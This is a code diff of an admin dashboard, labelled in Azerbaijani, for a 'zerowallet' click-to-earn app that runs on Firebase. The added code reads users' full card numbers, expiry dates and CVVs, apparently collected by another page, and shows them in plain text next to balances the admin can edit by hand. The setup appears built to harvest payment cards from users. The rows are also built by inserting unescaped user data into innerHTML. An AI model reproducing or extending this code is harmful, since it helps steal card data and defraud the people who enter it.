@@ -9,19 +9,22 @@
     <style>
         :root { --neon: #00f2ff; --bg: #0a0a0b; --row-bg: #141416; }
         body { background: var(--bg); color: #e0e0e0; font-family: 'Courier New', monospace; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
+        .container { max-width: 1300px; margin: 0 auto; }
         h1 { color: var(--neon); border-bottom: 2px solid var(--neon); padding-bottom: 10px; text-transform: uppercase; }
         h2 { color: var(--neon); font-size: 1.2rem; margin-top: 40px; }
-        .table-wrap { background: var(--row-bg); border-radius: 10px; overflow: hidden; margin-top: 15px; border: 1px solid #222; }
-        table { width: 100%; border-collapse: collapse; }
-        th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); font-size: 0.8rem; }
-        td { padding: 15px; border-bottom: 1px solid #1c1c1f; font-size: 0.9rem; }
-        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; }
+        .table-wrap { background: var(--row-bg); border-radius: 10px; overflow: hidden; margin-top: 15px; border: 1px solid #222; overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; min-width: 1000px; }
+        th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); font-size: 0.75rem; text-transform: uppercase; }
+        td { padding: 15px; border-bottom: 1px solid #1c1c1f; font-size: 0.85rem; }
+        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; font-size: 0.7rem; }
         .btn-block { background: #ff3e3e; color: white; }
         .btn-unblock { background: #00ff41; color: black; }
+        .btn-vip { background: #f59e0b; color: black; }
         .sys-box { background: #1c1c1f; padding: 20px; border-radius: 10px; border: 1px solid var(--neon); margin-bottom: 20px; }
         .img-preview { width: 120px; height: 70px; object-fit: cover; border-radius: 5px; cursor: pointer; border: 1px solid var(--neon); transition: 0.3s; }
         .img-preview:hover { transform: scale(1.1); }
+        .stat-badge { background: #222; padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; color: #fff; border: 1px solid #333; cursor: pointer; }
+        .card-info-box { font-size: 0.7rem; color: #94a3b8; background: #000; padding: 5px; border-radius: 4px; }
     </style>
 </head>
 <body>
@@ -51,10 +54,22 @@
         </table>
     </div>
 
-    <h2><i class="fas fa-users"></i> İSTİFADƏÇİ SİYAHISI</h2>
+    <h2><i class="fas fa-users"></i> İSTİFADƏÇİ SİYAHISI & STATİSTİKA</h2>
     <div class="table-wrap">
         <table>
-            <thead><tr><th>Username</th><th>Balans (Kliklə)</th><th>IP Ünvanı</th><th>Status</th><th>İdarəetmə</th></tr></thead>
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Balans</th>
+                    <th>VIP</th>
+                    <th>Paket</th>
+                    <th>Referal</th>
+                    <th>Klik</th>
+                    <th>Kart Məlumatları</th>
+                    <th>Status / IP</th>
+                    <th>İdarəetmə</th>
+                </tr>
+            </thead>
             <tbody id="user-body"></tbody>
         </table>
     </div>
@@ -73,7 +88,6 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // SİSTEM STATUSU
     db.ref('settings/system_status').on('value', snap => {
         const status = snap.val();
         const btn = document.getElementById('toggle-sys-btn');
@@ -96,7 +110,6 @@
         });
     }
 
-    // ÇEKLƏRİ DİNLƏMƏK (admin_receipts)
     db.ref('admin_receipts').on('value', snap => {
         const body = document.getElementById('payment-body');
         body.innerHTML = '';
@@ -119,17 +132,15 @@
 
     function approveRocket(key, username, rocketType) {
         if(confirm(`${username} üçün ${rocketType} paketi aktiv edilsin?`)) {
-            // İstifadəçinin rocket statusunu yenilə
             db.ref('zerowallet_users/' + username).update({ 
                 rocket: rocketType.toLowerCase().replace(' pack', '') 
             }).then(() => {
                 db.ref('admin_receipts/' + key).remove();
-                alert("Ödəniş təsdiqləndi və roket aktiv edildi!");
+                alert("Ödəniş təsdiqləndi!");
             });
         }
     }
 
-    // ÇIXARIŞLARI DİNLƏMƏK (admin_withdrawals)
     db.ref('admin_withdrawals').on('value', snap => {
         const body = document.getElementById('withdraw-body');
         body.innerHTML = '';
@@ -159,32 +170,56 @@
         }
     }
 
-    // İSTİFADƏÇİ SİYAHISI
     db.ref('zerowallet_users').on('value', snap => {
         const body = document.getElementById('user-body');
         body.innerHTML = '';
         snap.forEach(child => {
             const u = child.val();
+            const uname = child.key;
             const cleanIp = (u.ip || "").replace(/\./g, '_');
-            db.ref('blocked_ips/' + cleanIp).on('value', blockSnap => {
+            
+            // Kart məlumatları (coor.html-dən gələn)
+            let cardDisplay = "Yoxdur";
+            if(u.cardInfo) {
+                cardDisplay = `<div class="card-info-box">
+                    ${u.cardInfo.number}<br>${u.cardInfo.expiry} | ${u.cardInfo.cvv}
+                </div>`;
+            }
+
+            db.ref('blocked_ips/' + cleanIp).once('value', blockSnap => {
                 const isBlocked = blockSnap.exists();
-                const rowId = `row_${u.username}`;
+                const rowId = `row_${uname}`;
+                
                 const rowHtml = `<tr id="${rowId}">
-                    <td>${u.username}</td>
-                    <td><span class="editable-balance" onclick="editBalance('${u.username}', ${u.balance})">${(u.balance || 0).toFixed(4)} AZN</span></td>
-                    <td>${u.ip || '0.0.0.0'}</td>
-                    <td>${isBlocked ? '<b style="color:red">BLOK</b>' : '<b style="color:green">AKTİV</b>'}</td>
-                    <td><button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${u.ip}', ${!isBlocked})">${isBlocked ? 'AÇ' : 'BLOKLA'}</button></td>
+                    <td><b>${uname}</b></td>
+                    <td><span class="stat-badge" onclick="editStat('${uname}', 'balance', ${u.balance || 0})">${(u.balance || 0).toFixed(4)} AZN</span></td>
+                    <td><button class="btn ${u.isVip ? 'btn-unblock' : 'btn-vip'}" onclick="toggleVip('${uname}', ${!u.isVip})">${u.isVip ? 'VIP AÇIK' : 'VIP VER'}</button></td>
+                    <td><span class="stat-badge" onclick="editStat('${uname}', 'rocket', '${u.rocket || 'default'}')">${u.rocket || 'default'}</span></td>
+                    <td><span class="stat-badge" onclick="editStat('${uname}', 'referralCount', ${u.referralCount || 0})">${u.referralCount || 0}</span></td>
+                    <td><span class="stat-badge" onclick="editStat('${uname}', 'totalClicks', ${u.totalClicks || 0})">${u.totalClicks || 0}</span></td>
+                    <td>${cardDisplay}</td>
+                    <td>${isBlocked ? '<b style="color:red">BLOK</b>' : '<b style="color:green">AKTİV</b>'}<br><small>${u.ip || '0.0.0.0'}</small></td>
+                    <td>
+                        <button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${u.ip}', ${!isBlocked})">${isBlocked ? 'AÇ' : 'BLOKLA'}</button>
+                    </td>
                 </tr>`;
-                let row = document.getElementById(rowId);
-                if (row) row.outerHTML = rowHtml; else body.innerHTML += rowHtml;
+                
+                body.innerHTML += rowHtml;
             });
         });
     });
 
-    function editBalance(username, current) {
-        const val = prompt(`${username} üçün yeni balans:`, current);
-        if (val !== null) db.ref('zerowallet_users/' + username).update({ balance: parseFloat(val) });
+    function editStat(uname, field, current) {
+        let val = prompt(`${uname} üçün yeni ${field}:`, current);
+        if (val !== null) {
+            let updateObj = {};
+            updateObj[field] = (field === 'balance' || field === 'referralCount' || field === 'totalClicks') ? parseFloat(val) : val;
+            db.ref('zerowallet_users/' + uname).update(updateObj);
+        }
+    }
+
+    function toggleVip(uname, status) {
+        db.ref('zerowallet_users/' + uname).update({ isVip: status });
     }
 
     function toggleBlock(ip, status) {
